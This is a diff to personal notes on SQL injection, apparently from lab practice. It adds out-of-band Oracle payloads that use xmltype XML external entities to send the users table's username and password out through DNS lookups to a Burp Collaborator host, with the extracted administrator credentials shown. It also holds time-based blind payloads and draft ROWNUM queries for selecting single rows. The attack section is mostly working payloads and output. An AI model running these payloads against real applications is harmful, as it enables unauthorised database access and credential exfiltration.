@@ -300,8 +300,33 @@ TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select+ascii(substr((select+'a'+f
 TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select ascii(substr((select+'ab'),1,1)))=97+THEN+pg_sleep(3)+ELSE+'a'+END)||' <<-- 3406 millis
 TrackingId=obviouslywrong'||(SELECT+CASE+WHEN+(select ascii(substr((select+'ab'),1,1)))=98+THEN+pg_sleep(3)+ELSE+'a'+END)||' <<-- 407 millis
 ```
+### out-of-band (oracle)
+```
+# xmltype
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//84an75wifd10t9wzljfzs7xn7ed51wpl.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+#The Collaborator server received a DNS lookup of type AAAA for the domain name **84an75wifd10t9wzljfzs7xn7ed51wpl.oastify.com**
 
+#test domain
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//hola.hpawsehr0mm9eih86s08dgiwsnyem9ay.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
 
+hola.hpawsehr0mm9eih86s08dgiwsnyem9ay.oastify.com
+#The Collaborator server received a DNS lookup of type AAAA for the domain name **hola.hpawsehr0mm9eih86s08dgiwsnyem9ay.oastify.com**.
+
+# the dot "." before the subdomain is important!
+
+#try:
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT password FROM (select password,ROWNUM AS RN FROM users) WHERE RN=1)||'.hpawsehr0mm9eih86s08dgiwsnyem9ay.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+(SELECT+*+FROM+(select+concat(username||':'||password,''),ROWNUM+AS+RN+FROM+users)+WHERE+RN=1)
+# no reply - worst case, take username and password separately, using rownum to determine which password matches which username
+# this didn't work probably due to length limit in dns subdomain length
+
+SELECT username FROM (select username,ROWNUM AS RN FROM users) WHERE RN=1
+# administrator.hpawsehr0mm9eih86s08dgiwsnyem9ay.oastify.com.
+
+SELECT password FROM (select password,ROWNUM AS RN FROM users) WHERE RN=1
+# 59jzm7znmj7bt5t1liio.hpawsehr0mm9eih86s08dgiwsnyem9ay.oastify.com
+```
 
 # drafts
 oracle tests
@@ -342,6 +367,30 @@ SELECT CASE WHEN (select substr((select 'a' from dual),1,1) from dual)=chr(98) T
 
 SELECT CASE WHEN (select ascii(substr((select 'a' from dual),1,1)) from dual)=98 THEN to_char(1/0) ELSE '' END FROM dual
 #(null) <<-- OK
+
+# concatenation into single row (listagg)
+SELECT listagg(firstname||':'||lastname||',') within group (order by firstname) FROM scientist
+
+SELECT listagg(firstname||':'||lastname||',') within group (order by firstname) FROM scientist
+
+# simpler concatenation (concat)
+SELECT concat(firstname||':'||lastname,'') FROM scientist
+
+# returns 1 row but cannot get nth row
+SELECT concat(firstname||':'||lastname,'') FROM scientist WHERE ROWNUM <= 1 
+
+# returns nth row <<-- the "AS RN" part is important!
+SELECT * FROM (select concat(firstname||':'||lastname,''),ROWNUM AS RN FROM scientist) WHERE RN=2
+# isaac:newton
+
+SELECT * FROM (select concat(firstname||':'||lastname,''),ROWNUM AS RN FROM scientist) WHERE RN=3
+# marie:curie
+
+SELECT * FROM (select firstname,ROWNUM AS RN FROM scientist) WHERE RN=3
+# marie
+
+SELECT firstname FROM (select firstname,ROWNUM AS RN FROM scientist) WHERE RN=3
+# marie
 ```
 postgresql tests
 ```
